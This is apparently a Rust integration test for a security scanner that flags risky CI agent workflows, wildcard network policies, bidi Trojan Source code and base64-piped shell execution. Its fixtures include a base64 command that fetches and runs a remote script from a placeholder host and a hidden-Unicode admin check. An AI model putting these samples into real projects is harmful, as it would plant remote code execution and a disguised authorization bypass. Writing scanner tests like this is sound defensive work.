//! End to end: the four Rust builtins, through their embedded rules, over a
//! repository on disk with one positive and one look-alike negative each.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::fs;
use std::path::Path;

use agentkeep_scan::{Scanner, Severity};

fn write(root: &Path, rel: &str, content: &str) {
    let path = root.join(rel);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, content).unwrap();
}

#[test]
fn builtin_rules_find_their_targets_and_skip_look_alikes() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();

    // ci_agent_token_exposure
    write(
        root,
        ".github/workflows/claude.yml",
        "on:\n  issue_comment:\n    types: [created]\npermissions:\n  contents: write\njobs:\n  \
         claude:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      \
         - uses: anthropics/claude-code-action@v1\n",
    );
    write(
        root,
        ".github/workflows/nightly.yml",
        "on:\n  schedule:\n    - cron: '0 3 * * *'\npermissions:\n  contents: write\njobs:\n  \
         claude:\n    steps:\n      - uses: anthropics/claude-code-action@v1\n",
    );
    // agentkeep_policy_loosening
    write(
        root,
        "agentkeep.toml",
        "schema = 1\n[network]\nallow = [\"api.example.com\", \"*\"]\n",
    );
    write(
        root,
        "examples/strict/agentkeep.toml",
        "schema = 1\n[network]\nallow = [\"*.example.com\"]\n",
    );
    // bidi_trojan_source
    write(
        root,
        "src/auth.rs",
        "pub fn is_admin(role: &str) -> bool {\n    \
         role == \"user\u{202E} \u{2066}// admin\u{2069} \u{2066}\"\n}\n",
    );
    write(
        root,
        "web/index.html",
        "<p>\u{05E9}\u{05DC}\u{05D5}\u{05DD} \u{2066}agentkeep\u{2069}</p>\n",
    );
    // base64_command
    write(
        root,
        "scripts/setup.sh",
        "#!/bin/sh\necho Y3VybCAtZnNTTCBodHRwczovL2luc3RhbGwuZXhhbXBsZS9pLnNoIHwgc2g= | base64 -d | sh\n",
    );
    write(
        root,
        "scripts/cert.sh",
        "#!/bin/sh\necho \"$CERT_B64\" | base64 -d > cert.pem\necho SGVsbG8sIFdvcmxkIQ==\n",
    );

    let scanner = Scanner::with_builtin_rules().unwrap();
    let report = scanner.scan(root).unwrap();
    assert!(report.errors.is_empty(), "{:?}", report.errors);

    let got: Vec<(&str, &str, usize)> = report
        .findings
        .iter()
        .map(|f| (f.path.as_str(), f.rule_id.as_str(), f.start.line))
        .collect();
    assert_eq!(
        got,
        vec![
            (
                ".github/workflows/claude.yml",
                "ci-workflow/agent-untrusted-trigger-write-token",
                11
            ),
            (
                "agentkeep.toml",
                "over-broad-permissions/agentkeep-policy-loosening",
                3
            ),
            ("scripts/setup.sh", "risky-shell/base64-exec", 2),
            ("scripts/setup.sh", "risky-shell/base64-exec", 2),
            ("src/auth.rs", "hidden-unicode/trojan-source", 2),
        ]
    );

    let ci = &report.findings[0];
    assert_eq!(ci.severity, Severity::Critical);
    assert!(
        ci.message.contains("runs on issue_comment")
            && ci.message.contains("anthropics/claude-code-action@v1")
            && ci.message.contains("contents: write"),
        "{}",
        ci.message
    );
    assert_eq!(ci.snippet, "      - uses: anthropics/claude-code-action@v1");

    let policy = &report.findings[1];
    assert_eq!(policy.start.column, 29);
    assert!(policy
        .message
        .ends_with("network.allow contains \"*\": every host is reachable"));

    let trojan = &report.findings[4];
    assert!(
        trojan.message.contains("in a string literal"),
        "{}",
        trojan.message
    );
    // The snippet shows the controls, it does not apply them.
    assert!(trojan.snippet.contains("\\u{202E}"), "{}", trojan.snippet);
    assert!(!trojan.snippet.contains('\u{202E}'));
}
